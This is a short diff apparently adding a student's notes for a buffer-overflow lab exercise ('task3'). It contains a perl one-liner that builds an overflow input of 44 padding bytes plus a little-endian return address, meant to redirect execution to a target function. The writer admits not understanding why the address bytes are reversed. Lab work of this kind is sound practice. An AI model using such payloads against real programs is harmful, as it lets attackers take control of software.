@@ -1,0 +1,7 @@
+task3:
+perl -e 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; print "\xc9\x61\x55\x56";' > /tmp/task3input
+
+the ending is the return address being replaced with the address of the function we want to run
+
+in this case the addr is 0x565561c9 but we need to reverse it and then overflow to it
+idk why we need to reverse it but we do. 44 A's and the addr
